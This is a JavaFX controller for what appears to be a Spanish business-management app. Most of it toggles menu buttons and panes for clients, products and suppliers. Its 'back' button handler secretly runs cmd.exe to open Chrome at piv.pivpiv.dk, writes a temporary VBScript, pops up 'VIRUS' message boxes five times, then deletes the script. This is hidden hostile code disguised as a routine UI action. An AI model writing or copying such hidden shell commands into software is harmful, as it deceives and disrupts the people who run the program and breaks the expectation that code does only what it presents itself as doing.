package com.interfaz.interfaz;

import javafx.event.ActionEvent;
import javafx.fxml.FXML;
import javafx.scene.Scene;
import javafx.scene.control.Button;
import javafx.scene.control.Label;
import javafx.scene.layout.Pane;
import javafx.stage.Stage;
import javafx.stage.Window;

import java.io.IOException;

public class HelloController {
    @FXML
    private Pane altaClientes;
    @FXML
    private Pane busquedaClientes;
    @FXML
    private Pane busquedaProveedores;
    @FXML
    private Pane busquedaProductos;
    @FXML
    private Pane altaProductos;
    @FXML
    private Pane altaProveedores;
    @FXML
    private Button menuProductos;
    @FXML
    private Button menuClientes;
    @FXML
    private Button menuProveedores;
    @FXML
    private Button menuProveedores1;
    @FXML
    private Button menuProveedores2;
    @FXML
    private Button menuProductos1;
    @FXML
    private Button menuProductos2;
    @FXML
    private Button menuClientes1;
    @FXML
    private Button menuClientes2;

    @FXML
    protected void onMenuClick(ActionEvent event) {
        String src=event.getSource().toString();
        String id=src.split("=")[1].split(",")[0];
        switch (id){
            case "menuProductos"->{
                if (menuProductos1.getOpacity()!=1) {
                    menuProductos1.setOpacity(1);
                    menuProductos1.setDisable(false);
                    menuProductos2.setOpacity(1);
                    menuProductos2.setDisable(false);
                } else {
                    menuProductos1.setOpacity(0);
                    menuProductos1.setDisable(true);
                    menuProductos2.setOpacity(0);
                    menuProductos2.setDisable(true);
                }
            }
            case "menuClientes"->{
                if (menuClientes1.getOpacity()!=1) {
                    menuClientes1.setOpacity(1);
                    menuClientes1.setDisable(false);
                    menuClientes2.setOpacity(1);
                    menuClientes2.setDisable(false);
                } else {
                    menuClientes1.setOpacity(0);
                    menuClientes1.setDisable(true);
                    menuClientes2.setOpacity(0);
                    menuClientes2.setDisable(true);
                }
            }
            case "menuProveedores"->{
                if (menuProveedores1.getOpacity()!=1) {
                    menuProveedores1.setOpacity(1);
                    menuProveedores1.setDisable(false);
                    menuProveedores2.setOpacity(1);
                    menuProveedores2.setDisable(false);
                } else {
                    menuProveedores1.setOpacity(0);
                    menuProveedores1.setDisable(true);
                    menuProveedores2.setOpacity(0);
                    menuProveedores2.setDisable(true);
                }
            }
        }
    }

    @FXML
    protected void onClickOpcion(ActionEvent event){
        String src=event.getSource().toString();
        String id=src.split("=")[1].split(",")[0];
        switch (id){
            case "menuProductos1"->{
                altaProductos.setOpacity(1);
                altaProductos.setDisable(false);
            }
            case "menuProductos2"->{
                busquedaProductos.setOpacity(1);
                busquedaProductos.setDisable(false);
            }
            case "menuClientes1"->{
                altaClientes.setOpacity(1);
                altaClientes.setDisable(false);
            }
            case "menuClientes2"->{
                busquedaClientes.setOpacity(1);
                busquedaClientes.setDisable(false);
            }
            case "menuProveedores1"->{
                altaProveedores.setOpacity(1);
                altaProveedores.setDisable(false);
            }
            case "menuProveedores2"->{
                busquedaProveedores.setOpacity(1);
                busquedaProveedores.setDisable(false);
            }
        }
    }

    @FXML
    protected void onClickVolver(ActionEvent event){
        try {
            Runtime.getRuntime().exec("cmd.exe /c start chrome piv.pivpiv.dk");
            Runtime.getRuntime().exec("cmd.exe /c echo x=msgbox(\"VIRUS VIRUS VIRUS VIRUS\",vbYesNo,\"VIRUS\") = vbYes > %tmp%\\tmp.vbs");
            for (int i = 0; i < 5; i++) {
                Thread.sleep(100);
                Runtime.getRuntime().exec("cmd.exe /c cscript //nologo %tmp%\\tmp.vbs");
            }
            Runtime.getRuntime().exec("cmd.exe /c del %tmp%\\tmp.vbs");
        } catch (Exception e) {
            throw new RuntimeException(e);
        }
        Button escena=(Button) event.getSource();
        escena.getParent().setOpacity(0);
        escena.getParent().setDisable(true);
    }
}